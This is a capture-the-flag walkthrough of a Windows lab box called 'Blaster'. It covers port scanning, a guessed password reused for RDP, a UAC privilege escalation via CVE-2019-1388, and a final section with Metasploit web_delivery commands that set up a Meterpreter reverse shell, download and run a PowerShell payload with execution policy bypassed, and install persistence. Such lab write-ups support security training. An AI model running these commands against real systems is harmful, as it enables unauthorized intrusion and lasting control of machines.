# Blaster

## Tools

- nmap
- xfreerdp

## Activate Forward Scanners and Launch Proton Torpedoes

### Port Enumeration

`:> nmap -Pn -sV -p 80,3389 10.64.169.228`

```md
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-18 23:39 -0600
Nmap scan report for 10.64.169.228
Host is up (0.035s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Directory Enumeration 

Start Firefox and the OWASP ZAP.  Configure the proxy as required and visit port  

SEt Forced Browse Options and initaite directory identification  

![ZAP Directory Buster](/assets/blaster-101.png)  

The identified directory appears to be a retro video game blog.  

![retro](/assets/blaster-102.png)  

### Initial Accesses

Since the author is a fan of the movie 'Ready Player One', it's likely the password needed is related to Wade Watts VR Character.  

The link on the bottom of the blog page leads to an admin page where the username and password give entry.  

![admin portal](/assets/blaster-103.png)  


The same credentials allow for RDP  

`:> xfreerdp3 /v:10.64.169.228 /u:wade /p:parzival`  

![rdp](/assets/blaster-104.png)  

## Breaching the Control Room

Checked through Event Viewer and IE history with no information available.

All other avenues being exhausted, checked the application on the Desktop against.

```powershell
get-filehash C:/Users/wade/Desktop/hhupd.exe -algorithm md5
```

Result: e3e86254fb1e35cfd7a93fa0dd39e6a3  

Checked this against [Virus Total](https://www.virustotal.com/gui/file/0745633619afd654735ea99f32721e3865d8132917f30e292e3f9273977dc021/detection)  

No malicous intent is detected.  

Internet search for "hhupd vulnerabililty" leads to the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2019-1388), among others.  

Perform and internet search for a proof-of-concept and used a [Medium Page](https://sotharo-meas.medium.com/cve-2019-1388-windows-privilege-escalation-through-uac-22693fa23f5f).  

The target file is located on the Administrator's Desktop  

## Adoption into the Collective

gain remote shell access and persistence

`:> msfconsole`  

`:> use exploit/multi/script/web_delivery`

`:> set payload windows/meterpreter/reverse_tcp`

`:> show targets` to identify the number representing powershell  

`:> set target 2`  

![msfconsole](/assets/blaster-105.png)  

Transfer the resulting powershell script to the target device. It can be copied and pasted or served to the target device as a .ps1.  

![persistence](/assets/blaster-106.png)  

Used "wade's" powershell to transfer my file `:> invoke-webrequest http:<tun 0 ip>/blaster.ps1`  

returned to the administrator command line and moved the file to the Administrator desktop `:> xcopy <path to blaster.ps1> C:\Users\Administrator\Desktop`  

Invoke the file with the script `:> powershell -ExecutionPolicy Bypass -File blaster.ps1`  

Run the persistence command `:> run persistence -X`  

